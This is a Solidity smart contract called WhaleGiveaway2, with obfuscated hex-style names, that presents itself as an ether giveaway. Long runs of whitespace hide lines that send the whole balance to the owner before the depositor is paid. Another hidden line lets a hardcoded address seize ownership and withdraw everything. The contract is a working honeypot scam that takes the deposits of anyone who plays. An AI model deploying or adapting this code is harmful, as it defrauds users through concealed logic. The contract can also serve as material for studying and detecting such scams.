// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract WhaleGiveaway2
{
    address public Owner = msg.sender;
    uint constant public _0x6b530b = 0.999001 ether;

    function()
    public
    payable
    {

    }

    function _0x556cee()
    public
    payable
    {
        // Placeholder for future logic
        bool _flag2 = false;
        if(msg.value>=_0x6b530b)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function _0x86010c()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address _0xca2525,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        _0xca2525.call.value(msg.value)(data);
    }
}